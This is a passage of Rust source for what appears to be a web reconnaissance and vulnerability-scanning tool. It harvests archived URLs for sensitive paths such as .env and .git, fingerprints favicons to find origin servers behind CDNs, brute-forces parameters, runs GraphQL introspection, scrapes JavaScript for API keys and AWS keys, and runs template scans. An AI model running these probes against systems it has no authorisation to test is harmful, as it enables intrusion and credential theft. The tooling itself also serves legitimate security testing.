            let url = format!(
                "https://web.archive.org/cdx/search/cdx?url={}/*&matchType={}&output=json&fl=timestamp,original,statuscode,mimetype&collapse=urlkey&limit={}",
                domain, match_type, limit
            );

            let resp = client.get(&url).send().await.map_err(|e| format!("Wayback Machine request failed: {}", e))?;
            let body = resp.text().await.map_err(|e| e.to_string())?;

            let rows: Vec<Vec<String>> = serde_json::from_str(&body).unwrap_or_default();

            // Skip header row
            let data_rows: Vec<&Vec<String>> = rows.iter().skip(1).collect();

            let interesting_patterns = [
                "/api/", "/v1/", "/v2/", "/v3/", "/graphql", "/admin", "/debug",
                ".env", ".git", ".svn", "config", "backup", ".sql", ".zip", ".tar",
                ".bak", ".old", "swagger", "openapi", "/internal/", "/private/",
                "phpinfo", ".log", "wp-config", "web.config", ".htaccess",
                "robots.txt", "sitemap.xml", "crossdomain.xml",
            ];

            let mut all_urls: Vec<serde_json::Value> = Vec::new();
            let mut interesting_urls: Vec<serde_json::Value> = Vec::new();

            for row in &data_rows {
                if row.len() < 4 { continue; }
                let timestamp = &row[0];
                let original = &row[1];
                let status = &row[2];
                let mime = &row[3];

                let entry = serde_json::json!({
                    "url": original,
                    "timestamp": timestamp,
                    "status_code": status,
                    "mime_type": mime,
                });

                let url_lower = original.to_lowercase();
                let is_interesting = interesting_patterns.iter().any(|p| url_lower.contains(p));

                if is_interesting {
                    interesting_urls.push(entry.clone());
                }
                all_urls.push(entry);
            }

            if filter_interesting {
                interesting_urls.sort_by(|a, b| {
                    let a_url = a["url"].as_str().unwrap_or("");
                    let b_url = b["url"].as_str().unwrap_or("");
                    a_url.cmp(b_url)
                });
            }

            Ok(serde_json::json!({
                "domain": domain,
                "total_snapshots": data_rows.len(),
                "interesting_endpoints": interesting_urls,
                "interesting_count": interesting_urls.len(),
                "all_urls_sample": &all_urls[..all_urls.len().min(100)],
                "confidence": "informational",
                "source": "Wayback Machine (web.archive.org)",
                "note": "These are HISTORICAL URLs. They may no longer exist. Test each interesting endpoint to verify current status."
            }))
        }

        "whois_lookup" => {
            let target = params["target"].as_str().ok_or("Missing target")?;

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_secs(15))
                .build().map_err(|e| e.to_string())?;

            // Determine if IP or domain
            let is_ip = target.parse::<std::net::IpAddr>().is_ok();
            let rdap_url = if is_ip {
                format!("https://rdap.org/ip/{}", target)
            } else {
                format!("https://rdap.org/domain/{}", target)
            };

            let resp = client.get(&rdap_url)
                .header("Accept", "application/rdap+json")
                .send().await.map_err(|e| format!("RDAP lookup failed: {}", e))?;

            let status = resp.status().as_u16();
            let body = resp.text().await.map_err(|e| e.to_string())?;
            let data: serde_json::Value = serde_json::from_str(&body).unwrap_or(serde_json::json!({}));

            if status != 200 {
                return Ok(serde_json::json!({
                    "target": target,
                    "error": format!("RDAP returned status {}", status),
                    "confidence": "informational"
                }));
            }

            // Extract useful fields
            let mut result = serde_json::json!({
                "target": target,
                "type": if is_ip { "ip" } else { "domain" },
                "confidence": "informational",
                "source": "RDAP (rdap.org)",
            });

            if is_ip {
                result["name"] = data["name"].clone();
                result["handle"] = data["handle"].clone();
                result["start_address"] = data["startAddress"].clone();
                result["end_address"] = data["endAddress"].clone();
                result["country"] = data["country"].clone();
                result["type"] = serde_json::json!("ip");

                // Extract entities (organizations)
                if let Some(entities) = data["entities"].as_array() {
                    let orgs: Vec<String> = entities.iter().filter_map(|e| {
                        e["vcardArray"].as_array().and_then(|v| v.get(1)).and_then(|props| {
                            props.as_array().and_then(|arr| {
                                arr.iter().find_map(|prop| {
                                    if prop[0].as_str() == Some("fn") {
                                        prop[3].as_str().map(|s| s.to_string())
                                    } else { None }
                                })
                            })
                        })
                    }).collect();
                    result["organizations"] = serde_json::json!(orgs);
                }
            } else {
                result["ldhName"] = data["ldhName"].clone();
                result["status"] = data["status"].clone();

                // Extract nameservers
                if let Some(ns) = data["nameservers"].as_array() {
                    let nameservers: Vec<String> = ns.iter().filter_map(|n| {
                        n["ldhName"].as_str().map(|s| s.to_string())
                    }).collect();
                    result["nameservers"] = serde_json::json!(nameservers);
                }

                // Extract events (dates)
                if let Some(events) = data["events"].as_array() {
                    for event in events {
                        let action = event["eventAction"].as_str().unwrap_or("");
                        let date = event["eventDate"].as_str().unwrap_or("");
                        match action {
                            "registration" => { result["created"] = serde_json::json!(date); }
                            "expiration" => { result["expires"] = serde_json::json!(date); }
                            "last changed" => { result["updated"] = serde_json::json!(date); }
                            _ => {}
                        }
                    }
                }

                // Extract entities
                if let Some(entities) = data["entities"].as_array() {
                    let mut registrar = String::new();
                    for entity in entities {
                        let roles: Vec<String> = entity["roles"].as_array().map(|r| {
                            r.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect()
                        }).unwrap_or_default();

                        if roles.contains(&"registrar".to_string()) {
                            if let Some(vcard) = entity["vcardArray"].as_array().and_then(|v| v.get(1)) {
                                if let Some(arr) = vcard.as_array() {
                                    for prop in arr {
                                        if prop[0].as_str() == Some("fn") {
                                            registrar = prop[3].as_str().unwrap_or("").to_string();
                                        }
                                    }
                                }
                            }
                        }
                    }
                    if !registrar.is_empty() {
                        result["registrar"] = serde_json::json!(registrar);
                    }
                }
            }

            Ok(result)
        }

        "asn_lookup" => {
            let target = params["target"].as_str().ok_or("Missing target")?;

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_secs(15))
                .build().map_err(|e| e.to_string())?;

            // If it starts with AS, it's an ASN number
            if target.to_uppercase().starts_with("AS") {
                let asn = target.trim_start_matches("AS").trim_start_matches("as");
                let rdap_url = format!("https://rdap.org/autnum/{}", asn);
                let resp = client.get(&rdap_url).send().await.map_err(|e| e.to_string())?;
                let body = resp.text().await.map_err(|e| e.to_string())?;
                let data: serde_json::Value = serde_json::from_str(&body).unwrap_or(serde_json::json!({}));

                Ok(serde_json::json!({
                    "asn": format!("AS{}", asn),
                    "name": data["name"],
                    "handle": data["handle"],
                    "country": data["country"],
                    "type": data["type"],
                    "start_autnum": data["startAutnum"],
                    "end_autnum": data["endAutnum"],
                    "confidence": "informational",
                    "source": "RDAP",
                }))
            } else {
                // It's an IP — use Team Cymru DNS lookup
                let ip: std::net::IpAddr = target.parse().map_err(|_| "Invalid IP address")?;
                let reversed = match ip {
                    std::net::IpAddr::V4(v4) => {
                        let octets = v4.octets();
                        format!("{}.{}.{}.{}.origin.asn.cymru.com", octets[3], octets[2], octets[1], octets[0])
                    }
                    std::net::IpAddr::V6(_) => return Err("IPv6 ASN lookup not yet supported".into()),
                };

                // Use HTTP DNS-over-HTTPS for the TXT record lookup
                let dns_url = format!("https://dns.google/resolve?name={}&type=TXT", reversed);
                let resp = client.get(&dns_url).send().await.map_err(|e| e.to_string())?;
                let body = resp.text().await.map_err(|e| e.to_string())?;
                let dns_data: serde_json::Value = serde_json::from_str(&body).unwrap_or(serde_json::json!({}));

                let mut asn_info = serde_json::json!({
                    "ip": target,
                    "confidence": "informational",
                    "source": "Team Cymru DNS + Google DoH",
                });

                if let Some(answers) = dns_data["Answer"].as_array() {
                    for answer in answers {
                        if let Some(data) = answer["data"].as_str() {
                            // Format: "AS_NUM | PREFIX | COUNTRY | REGISTRY | DATE"
                            let data = data.trim_matches('"');
                            let parts: Vec<&str> = data.split('|').map(|s| s.trim()).collect();
                            if parts.len() >= 3 {
                                asn_info["asn"] = serde_json::json!(format!("AS{}", parts[0].trim()));
                                asn_info["prefix"] = serde_json::json!(parts[1].trim());
                                asn_info["country"] = serde_json::json!(parts[2].trim());
                                if parts.len() >= 4 { asn_info["registry"] = serde_json::json!(parts[3].trim()); }
                                if parts.len() >= 5 { asn_info["allocated"] = serde_json::json!(parts[4].trim()); }
                            }
                        }
                    }
                }

                // Also try RDAP for the ASN details
                if let Some(asn) = asn_info["asn"].as_str() {
                    let asn_num = asn.trim_start_matches("AS");
                    let rdap_url = format!("https://rdap.org/autnum/{}", asn_num);
                    if let Ok(resp) = client.get(&rdap_url).send().await {
                        if let Ok(body) = resp.text().await {
                            if let Ok(data) = serde_json::from_str::<serde_json::Value>(&body) {
                                asn_info["org_name"] = data["name"].clone();
                                asn_info["org_handle"] = data["handle"].clone();
                            }
                        }
                    }
                }

                Ok(asn_info)
            }
        }

        "favicon_hash" => {
            let target = params["target"].as_str().ok_or("Missing target")?;

            // Normalize URL
            let favicon_url = if target.starts_with("http") {
                if target.ends_with("/favicon.ico") {
                    target.to_string()
                } else {
                    let base = target.trim_end_matches('/');
                    format!("{}/favicon.ico", base)
                }
            } else {
                format!("https://{}/favicon.ico", target)
            };

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_secs(15))
                .build().map_err(|e| e.to_string())?;

            let resp = client.get(&favicon_url).send().await.map_err(|e| format!("Failed to fetch favicon: {}", e))?;
            let status = resp.status().as_u16();

            if status != 200 {
                return Ok(serde_json::json!({
                    "target": target,
                    "favicon_url": favicon_url,
                    "error": format!("Favicon not found (HTTP {})", status),
                    "confidence": "informational"
                }));
            }

            let favicon_bytes = resp.bytes().await.map_err(|e| e.to_string())?;

            if favicon_bytes.is_empty() {
                return Ok(serde_json::json!({
                    "target": target,
                    "error": "Empty favicon response",
                    "confidence": "informational"
                }));
            }

            // Compute MurmurHash3 (Shodan-compatible)
            // Shodan uses: base64(favicon_bytes) with \n every 76 chars, then mmh3
            let b64 = base64_encode(&favicon_bytes);
            // Add newlines every 76 chars (like Python's encodebytes)
            let mut b64_with_newlines = String::new();
            for (i, ch) in b64.chars().enumerate() {
                b64_with_newlines.push(ch);
                if (i + 1) % 76 == 0 { b64_with_newlines.push('\n'); }
            }
            if !b64_with_newlines.ends_with('\n') { b64_with_newlines.push('\n'); }

            // MurmurHash3 32-bit implementation
            let hash = murmur3_32(b64_with_newlines.as_bytes(), 0) as i32;

            // Check for known default favicons
            let known_defaults: Vec<(i32, &str)> = vec![
                (116323821, "Apache default"),
                (1354251532, "Nginx default"),
                (-1137731592, "IIS default"),
                (81586312, "Apache Tomcat"),
                (876876147, "WordPress default"),
            ];
            let is_default = known_defaults.iter().find(|(h, _)| *h == hash);

            let mut result = serde_json::json!({
                "target": target,
                "favicon_url": favicon_url,
                "favicon_hash": hash,
                "favicon_size_bytes": favicon_bytes.len(),
                "search_queries": {
                    "shodan": format!("http.favicon.hash:{}", hash),
                    "fofa": format!("icon_hash=\"{}\"", hash),
                    "zoomeye": format!("iconhash:\"{}\"", hash),
                    "censys": format!("services.http.response.favicons.hashes.shodan:{}", hash),
                },
                "confidence": "informational",
                "source": "Local MurmurHash3 computation",
                "note": "Use these search queries on Shodan/FOFA/ZoomEye web UI to find servers with the same favicon (potential origin IPs behind CDN)."
            });

            if let Some((_, name)) = is_default {
                result["warning"] = serde_json::json!(format!("This is a known DEFAULT favicon ({}). Results will include many unrelated servers.", name));
                result["is_default_favicon"] = serde_json::json!(true);
            }

            Ok(result)
        }

        "discover_parameters" => {
            let target = params["target"].as_str().ok_or("Missing target")?;
            let method = params["method"].as_str().unwrap_or("GET");
            let wordlist_size = params["wordlist"].as_str().unwrap_or("medium");

            let params_small = vec![
                "debug", "admin", "test", "token", "secret", "key", "callback", "redirect",
                "url", "file", "path", "id", "user", "password", "email", "action",
                "cmd", "exec", "query", "search", "lang", "format", "type", "mode",
                "view", "source", "target", "next", "return", "ref", "download",
                "config", "setup", "install", "trace", "verbose", "log", "api_key",
                "access_token", "auth", "role", "level", "page", "limit", "offset",
                "sort", "order", "fields", "include", "exclude",
            ];
            let params_medium: Vec<&str> = {
                let mut v = params_small.clone();
                v.extend_from_slice(&[
                    "username", "passwd", "pass", "login", "register", "signup", "forgot",
                    "reset", "verify", "confirm", "activate", "deactivate", "enable", "disable",
                    "start", "stop", "status", "health", "info", "version", "env", "environment",
                    "database", "db", "host", "port", "server", "proxy", "gateway",
                    "internal", "external", "private", "public", "staging", "production",
                    "dev", "development", "preview", "draft", "publish", "unpublish",
                    "export", "import", "upload", "backup", "restore", "migrate",
                    "output", "input", "data", "json", "xml", "csv", "raw",
                    "force", "override", "skip", "ignore", "allow", "deny", "block",
                    "timeout", "retry", "cache", "nocache", "refresh", "reload",
                    "width", "height", "size", "quality", "scale", "crop", "resize",
                    "webhook", "notify", "alert", "event", "trigger", "hook",
                    "template", "theme", "layout", "component", "module", "plugin",
                    "locale", "language", "country", "region", "timezone", "currency",
                    "api", "api_version", "v", "ver", "revision", "build",
                    "client_id", "client_secret", "app_id", "app_key", "consumer_key",
                    "session", "sid", "csrf", "nonce", "state", "code",
                    "grant_type", "response_type", "scope", "redirect_uri",
                    "filename", "filepath", "dir", "directory", "folder", "bucket",
                    "table", "column", "row", "record", "collection", "document",
                    "filter", "where", "condition", "criteria", "match", "pattern",
                    "min", "max", "from", "to", "since", "until", "before", "after",
                    "count", "total", "sum", "avg", "group", "aggregate",
                    "select", "insert", "update", "delete", "upsert", "merge",
                    "join", "left", "right", "inner", "outer", "cross",
                    "asc", "desc", "ascending", "descending", "reverse",
                    "encode", "decode", "encrypt", "decrypt", "sign", "verify_signature",
                    "compress", "decompress", "zip", "unzip", "gzip",
                    "base64", "hex", "binary", "text", "string", "number", "boolean",
                    "null", "undefined", "empty", "blank", "default", "fallback",
                    "callback_url", "return_url", "success_url", "error_url", "cancel_url",
                ]);
                v
            };
            let params_large: Vec<&str> = {
                let mut v = params_medium.clone();
                v.extend_from_slice(&[
                    "accountId", "userId", "customerId", "merchantId", "tenantId",
                    "organizationId", "teamId", "projectId", "workspaceId", "groupId",
                    "resourceId", "objectId", "entityId", "itemId", "productId",
                    "orderId", "transactionId", "paymentId", "invoiceId", "subscriptionId",
                    "planId", "priceId", "couponId", "discountId", "taxId",
                    "cardId", "bankId", "walletId", "addressId", "shippingId",
                    "trackingId", "referenceId", "correlationId", "requestId", "traceId",
                    "spanId", "parentId", "rootId", "batchId", "jobId", "taskId",
                    "queueId", "channelId", "topicId", "messageId", "notificationId",
                    "alertId", "incidentId", "ticketId", "issueId", "bugId",
                    "featureId", "storyId", "epicId", "sprintId", "milestoneId",
                    "releaseId", "deploymentId", "environmentId", "configId", "settingId",
                    "rpc", "jsonrpc", "method_name", "procedure", "operation",
                    "wpdb", "phpMyAdmin", "phpmyadmin", "mysql", "postgres", "mongodb",
                    "redis", "memcached", "elasticsearch", "solr", "rabbitmq", "kafka",
                    "aws", "azure", "gcp", "docker", "kubernetes", "terraform",
                    "jwt", "bearer", "oauth", "saml", "ldap", "kerberos", "openid",
                    "two_factor", "mfa", "otp", "totp", "recovery", "backup_code",
                    "captcha", "recaptcha", "turnstile", "challenge", "response_token",
                ]);
                v
            };

            let wordlist: Vec<&str> = match wordlist_size {
                "small" => params_small,
                "large" => params_large,
                _ => params_medium,
            };

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .redirect(reqwest::redirect::Policy::none())
                .timeout(std::time::Duration::from_secs(10))
                .build().map_err(|e| e.to_string())?;

            // Get baseline
            let baseline_resp = if method == "POST" {
                client.post(target).send().await
            } else {
                client.get(target).send().await
            }.map_err(|e| format!("Baseline request failed: {}", e))?;

            let baseline_status = baseline_resp.status().as_u16();
            let baseline_body = baseline_resp.text().await.unwrap_or_default();
            let baseline_len = baseline_body.len();

            let mut discovered = Vec::new();
            let total = wordlist.len();

            for param in &wordlist {
                let test_url = if method == "GET" {
                    if target.contains('?') {
                        format!("{}&{}=wondertestvalue123", target, param)
                    } else {
                        format!("{}?{}=wondertestvalue123", target, param)
                    }
                } else {
                    target.to_string()
                };

                let resp = if method == "POST" {
                    client.post(&test_url)
                        .header("Content-Type", "application/x-www-form-urlencoded")
                        .body(format!("{}=wondertestvalue123", param))
                        .send().await
                } else {
                    client.get(&test_url).send().await
                };

                if let Ok(resp) = resp {
                    let test_status = resp.status().as_u16();
                    let test_body = resp.text().await.unwrap_or_default();
                    let test_len = test_body.len();

                    // Detect difference
                    let status_diff = test_status != baseline_status;
                    let size_diff = if baseline_len > 0 {
                        ((test_len as f64 - baseline_len as f64) / baseline_len as f64).abs()
                    } else { 0.0 };

                    let body_contains_param = test_body.contains(param) && !baseline_body.contains(param);

                    if status_diff || size_diff > 0.05 || body_contains_param {
                        discovered.push(serde_json::json!({
                            "parameter": param,
                            "evidence": {
                                "status_changed": status_diff,
                                "baseline_status": baseline_status,
                                "test_status": test_status,
                                "size_diff_percent": format!("{:.1}%", size_diff * 100.0),
                                "baseline_size": baseline_len,
                                "test_size": test_len,
                                "reflected_in_body": body_contains_param,
                            },
                            "confidence": if status_diff && body_contains_param { "firm" }
                                else if status_diff || body_contains_param { "tentative" }
                                else { "tentative" },
                        }));
                    }
                }
            }

            Ok(serde_json::json!({
                "target": target,
                "method": method,
                "discovered_parameters": discovered,
                "discovered_count": discovered.len(),
                "tested_count": total,
                "wordlist_size": wordlist_size,
                "confidence": "informational",
                "note": "Parameters marked as 'tentative' need manual verification. A size diff alone may be caused by dynamic content."
            }))
        }

        "graphql_introspect" => {
            let target = params["target"].as_str().ok_or("Missing target")?;

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_secs(15))
                .build().map_err(|e| e.to_string())?;

            let introspection_query = r#"{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields(includeDeprecated: true) { name description args { name type { name kind ofType { name kind } } } type { name kind ofType { name kind } } isDeprecated deprecationReason } } } }"}"#;

            let mut req = client.post(target)
                .header("Content-Type", "application/json")
                .body(introspection_query.to_string());

            // Add custom headers
            if let Some(headers) = params["headers"].as_object() {
                for (key, val) in headers {
                    if let Some(v) = val.as_str() {
                        req = req.header(key, v);
                    }
                }
            }

            let resp = req.send().await.map_err(|e| format!("GraphQL request failed: {}", e))?;
            let status = resp.status().as_u16();
            let body = resp.text().await.map_err(|e| e.to_string())?;

            let data: serde_json::Value = serde_json::from_str(&body).unwrap_or(serde_json::json!({}));

            // Check if introspection is enabled
            if data["data"]["__schema"].is_null() {
                let error_msg = data["errors"].as_array()
                    .and_then(|e| e.first())
                    .and_then(|e| e["message"].as_str())
                    .unwrap_or("Introspection query returned no schema");

                return Ok(serde_json::json!({
                    "target": target,
                    "introspectable": false,
                    "status": status,
                    "error": error_msg,
                    "confidence": "informational",
                    "note": "GraphQL introspection is disabled on this endpoint. Try field suggestion attacks or wordlist-based query discovery."
                }));
            }

            // Extract useful schema info
            let schema = &data["data"]["__schema"];
            let types = schema["types"].as_array().unwrap_or(&Vec::new()).clone();

            let mut queries = Vec::new();
            let mut mutations = Vec::new();
            let mut user_types = Vec::new();

            let query_type_name = schema["queryType"]["name"].as_str().unwrap_or("Query");
            let mutation_type_name = schema["mutationType"]["name"].as_str().unwrap_or("Mutation");

            for type_def in &types {
                let name = type_def["name"].as_str().unwrap_or("");
                let kind = type_def["kind"].as_str().unwrap_or("");

                // Skip built-in types
                if name.starts_with("__") { continue; }

                if name == query_type_name {
                    if let Some(fields) = type_def["fields"].as_array() {
                        for field in fields {
                            queries.push(serde_json::json!({
                                "name": field["name"],
                                "description": field["description"],
                                "args": field["args"],
                                "return_type": field["type"]["name"],
                                "deprecated": field["isDeprecated"],
                            }));
                        }
                    }
                } else if name == mutation_type_name {
                    if let Some(fields) = type_def["fields"].as_array() {
                        for field in fields {
                            mutations.push(serde_json::json!({
                                "name": field["name"],
                                "description": field["description"],
                                "args": field["args"],
                                "deprecated": field["isDeprecated"],
                            }));
                        }
                    }
                } else if kind == "OBJECT" || kind == "INPUT_OBJECT" {
                    let fields_summary: Vec<String> = type_def["fields"].as_array()
                        .unwrap_or(&Vec::new())
                        .iter()
                        .take(10)
                        .filter_map(|f| f["name"].as_str().map(|s| s.to_string()))
                        .collect();

                    if !fields_summary.is_empty() {
                        user_types.push(serde_json::json!({
                            "name": name,
                            "kind": kind,
                            "fields": fields_summary,
                        }));
                    }
                }
            }

            Ok(serde_json::json!({
                "target": target,
                "introspectable": true,
                "queries": queries,
                "query_count": queries.len(),
                "mutations": mutations,
                "mutation_count": mutations.len(),
                "types": user_types,
                "type_count": user_types.len(),
                "total_schema_types": types.len(),
                "confidence": "certain",
                "note": "Introspection is ENABLED. This exposes the full API schema. Look for sensitive mutations (deleteUser, updateRole, transferFunds) and queries that may have IDOR issues."
            }))
        }

        "js_link_finder" => {
            let target = params["target"].as_str().ok_or("Missing target")?;
            let max_js = params["max_js_files"].as_u64().unwrap_or(20) as usize;

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_secs(15))
                .build().map_err(|e| e.to_string())?;

            // Fetch the main page
            let resp = client.get(target).send().await.map_err(|e| format!("Failed to fetch target: {}", e))?;
            let html = resp.text().await.map_err(|e| e.to_string())?;

            // Extract script src URLs
            let script_re = regex::Regex::new(r#"(?i)<script[^>]+src=["']([^"']+)["']"#).ok();
            let base_url = url::Url::parse(target).ok();

            let js_urls: Vec<String> = script_re.map(|re| re.captures_iter(&html).filter_map(|c| {
                let src = c.get(1)?.as_str();
                if src.starts_with("http") { return Some(src.to_string()); }
                base_url.as_ref().and_then(|b| b.join(src).ok().map(|u| u.to_string()))
            }).take(max_js).collect()).unwrap_or_default();

            let mut all_endpoints = std::collections::BTreeSet::new();
            let mut all_secrets = Vec::new();
            let mut external_urls = std::collections::BTreeSet::new();

            // Regex patterns for interesting things
            let url_re = regex::Regex::new(r#"["']((?:https?://[^\s"'<>]+)|(?:/(?:api|v[0-9]|graphql|admin|internal|private|auth|oauth|user|account|payment|webhook)[^\s"'<>]*))"#).ok();
            let path_re = regex::Regex::new(r#"["'](/[a-zA-Z0-9_\-/.]+(?:\?[^"']*)?)"#).ok();
            let secret_re = regex::Regex::new(r#"(?i)(?:api[_-]?key|api[_-]?secret|access[_-]?token|auth[_-]?token|secret[_-]?key|private[_-]?key|password|passwd|bearer)\s*[:=]\s*["']([^"']{8,})["']"#).ok();
            let aws_re = regex::Regex::new(r"(?:AKIA|ASIA)[A-Z0-9]{16}").ok();

            for js_url in &js_urls {
                if let Ok(resp) = client.get(js_url).send().await {
                    if let Ok(js_body) = resp.text().await {
                        // Extract URLs
                        if let Some(ref re) = url_re {
                            for cap in re.captures_iter(&js_body) {
                                if let Some(m) = cap.get(1) {
                                    let found = m.as_str().to_string();
                                    if found.starts_with("http") {
                                        external_urls.insert(found);
                                    } else {
                                        all_endpoints.insert(found);
                                    }
                                }
                            }
                        }

                        // Extract relative paths
                        if let Some(ref re) = path_re {
                            for cap in re.captures_iter(&js_body) {
                                if let Some(m) = cap.get(1) {
                                    let path = m.as_str();
                                    if path.len() > 3 && !path.contains("//") && !path.ends_with(".js") && !path.ends_with(".css") && !path.ends_with(".png") && !path.ends_with(".jpg") && !path.ends_with(".svg") {
                                        all_endpoints.insert(path.to_string());
                                    }
                                }
                            }
                        }

                        // Extract secrets
                        if let Some(ref re) = secret_re {
                            for cap in re.captures_iter(&js_body) {
                                if let Some(m) = cap.get(1) {
                                    all_secrets.push(serde_json::json!({
                                        "value": m.as_str(),
                                        "source_file": js_url,
                                        "context": &js_body[cap.get(0).unwrap().start().saturating_sub(20)..cap.get(0).unwrap().end().min(js_body.len())],
                                    }));
                                }
                            }
                        }

                        // AWS keys
                        if let Some(ref re) = aws_re {
                            for m in re.find_iter(&js_body) {
                                all_secrets.push(serde_json::json!({
                                    "type": "AWS Access Key",
                                    "value": m.as_str(),
                                    "source_file": js_url,
                                    "severity": "critical",
                                }));
                            }
                        }
                    }
                }
            }

            let endpoints: Vec<String> = all_endpoints.into_iter().collect();
            let externals: Vec<String> = external_urls.into_iter().collect();

            Ok(serde_json::json!({
                "target": target,
                "js_files_analyzed": js_urls.len(),
                "js_files": js_urls,
                "endpoints": endpoints,
                "endpoint_count": endpoints.len(),
                "external_urls": externals,
                "external_url_count": externals.len(),
                "secrets": all_secrets,
                "secret_count": all_secrets.len(),
                "confidence": "informational",
                "note": "Endpoints extracted from JavaScript files. These are potential API routes that may not be publicly documented."
            }))
        }

        "reverse_ip_lookup" => {
            let ip = params["ip"].as_str().ok_or("Missing ip")?;
            let check_vhosts = params["check_vhosts"].as_bool().unwrap_or(false);

            // Use Google DoH for PTR lookup
            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_secs(10))
                .build().map_err(|e| e.to_string())?;

            // Reverse the IP for PTR query
            let ip_addr: std::net::IpAddr = ip.parse().map_err(|_| "Invalid IP address")?;
            let ptr_name = match ip_addr {
                std::net::IpAddr::V4(v4) => {
                    let o = v4.octets();
                    format!("{}.{}.{}.{}.in-addr.arpa", o[3], o[2], o[1], o[0])
                }
                std::net::IpAddr::V6(_) => return Err("IPv6 reverse lookup not yet supported".into()),
            };

            let dns_url = format!("https://dns.google/resolve?name={}&type=PTR", ptr_name);
            let resp = client.get(&dns_url).send().await.map_err(|e| e.to_string())?;
            let body = resp.text().await.map_err(|e| e.to_string())?;
            let dns_data: serde_json::Value = serde_json::from_str(&body).unwrap_or(serde_json::json!({}));

            let mut hostnames = Vec::new();
            if let Some(answers) = dns_data["Answer"].as_array() {
                for answer in answers {
                    if let Some(data) = answer["data"].as_str() {
                        hostnames.push(data.trim_end_matches('.').to_string());
                    }
                }
            }

            let mut virtual_hosts = Vec::new();
            if check_vhosts && !hostnames.is_empty() {
                // Try some common subdomains on the discovered hostnames
                let domain = hostnames.first().unwrap();
                let parts: Vec<&str> = domain.split('.').collect();
                let base_domain = if parts.len() >= 2 {
                    format!("{}.{}", parts[parts.len()-2], parts[parts.len()-1])
                } else {
                    domain.clone()
                };

                let vhost_prefixes = ["www", "api", "admin", "mail", "webmail", "dev", "staging", "test", "beta", "app"];
                for prefix in &vhost_prefixes {
                    let vhost = format!("{}.{}", prefix, base_domain);
                    let test_url = format!("https://{}",  ip);
                    if let Ok(resp) = client.get(&test_url)
                        .header("Host", &vhost)
                        .send().await {
                        let status = resp.status().as_u16();
                        let content_length = resp.content_length().unwrap_or(0);
                        if status != 0 {
                            virtual_hosts.push(serde_json::json!({
                                "hostname": vhost,
                                "status": status,
                                "content_length": content_length,
                            }));
                        }
                    }
                }
            }

            Ok(serde_json::json!({
                "ip": ip,
                "ptr_records": hostnames,
                "hostname_count": hostnames.len(),
                "virtual_hosts": virtual_hosts,
                "vhost_count": virtual_hosts.len(),
                "confidence": "informational",
                "source": "Google DoH (PTR)",
            }))
        }

        // ─── Nuclei Template Engine ─────────────────────────────────────

        "template_list" => {
            let category = params["category"].as_str().unwrap_or("");
            let severity = params["severity"].as_str().unwrap_or("");
            let tags = params["tags"].as_str().unwrap_or("");
            let limit = params["limit"].as_u64().unwrap_or(50) as usize;

            let templates = get_template_index();
            let tag_list: Vec<&str> = if tags.is_empty() { vec![] } else { tags.split(',').map(|s| s.trim()).collect() };

            let filtered: Vec<&NucleiTemplate> = templates.iter().filter(|t| {
                if !category.is_empty() && !t.category.contains(category) { return false; }
                if !severity.is_empty() && t.severity != severity { return false; }
                if !tag_list.is_empty() && !tag_list.iter().any(|tag| t.tags.contains(&tag.to_string())) { return false; }
                true
            }).take(limit).collect();

            let results: Vec<serde_json::Value> = filtered.iter().map(|t| {
                serde_json::json!({
                    "id": t.id,
                    "name": t.name,
                    "severity": t.severity,
                    "category": t.category,
                    "tags": t.tags,
                    "description": t.description,
                    "author": t.author,
                })
            }).collect();

            Ok(serde_json::json!({
                "templates": results,
                "count": results.len(),
                "total_available": templates.len(),
                "filters_applied": {
                    "category": category,
                    "severity": severity,
                    "tags": tags,
                },
            }))
        }

        "template_search" => {
            let query = params["query"].as_str().ok_or("Missing query")?;
            let limit = params["limit"].as_u64().unwrap_or(30) as usize;

            let templates = get_template_index();
            let query_lower = query.to_lowercase();
            let terms: Vec<&str> = query_lower.split_whitespace().collect();

            let mut scored: Vec<(usize, &NucleiTemplate)> = templates.iter().filter_map(|t| {
                let searchable = format!("{} {} {} {} {}", t.id, t.name, t.description, t.tags.join(" "), t.category).to_lowercase();
                let score: usize = terms.iter().map(|term| {
                    if searchable.contains(term) { 1 } else { 0 }
                }).sum();
                if score > 0 { Some((score, t)) } else { None }
            }).collect();

            scored.sort_by(|a, b| b.0.cmp(&a.0));

            let results: Vec<serde_json::Value> = scored.iter().take(limit).map(|(score, t)| {
                serde_json::json!({
                    "id": t.id,
                    "name": t.name,
                    "severity": t.severity,
                    "category": t.category,
                    "tags": t.tags,
                    "description": t.description,
                    "match_score": score,
                })
            }).collect();

            Ok(serde_json::json!({
                "query": query,
                "results": results,
                "count": results.len(),
                "total_searched": templates.len(),
            }))
        }

        "template_scan" => {
            let target = params["target"].as_str().ok_or("Missing target")?;
            let template_ids: Vec<String> = params["template_ids"].as_array()
                .map(|a| a.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
                .unwrap_or_default();
            let category = params["category"].as_str().unwrap_or("");
            let tags = params["tags"].as_str().unwrap_or("");
            let max_templates = params["max_templates"].as_u64().unwrap_or(100) as usize;

            let all_templates = get_template_index();
            let tag_list: Vec<&str> = if tags.is_empty() { vec![] } else { tags.split(',').map(|s| s.trim()).collect() };

            // Filter templates to run
            let templates_to_run: Vec<&NucleiTemplate> = all_templates.iter().filter(|t| {
                if !template_ids.is_empty() {
                    return template_ids.iter().any(|id| t.id == *id);
                }
                if !category.is_empty() && !t.category.contains(category) { return false; }
                if !tag_list.is_empty() && !tag_list.iter().any(|tag| t.tags.contains(&tag.to_string())) { return false; }
                true
            }).take(max_templates).collect();

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .redirect(reqwest::redirect::Policy::none())
                .timeout(std::time::Duration::from_secs(10))
                .build().map_err(|e| e.to_string())?;

            let mut findings = Vec::new();
            let mut scanned = 0;

            for template in &templates_to_run {
                scanned += 1;

                for req_def in &template.requests {
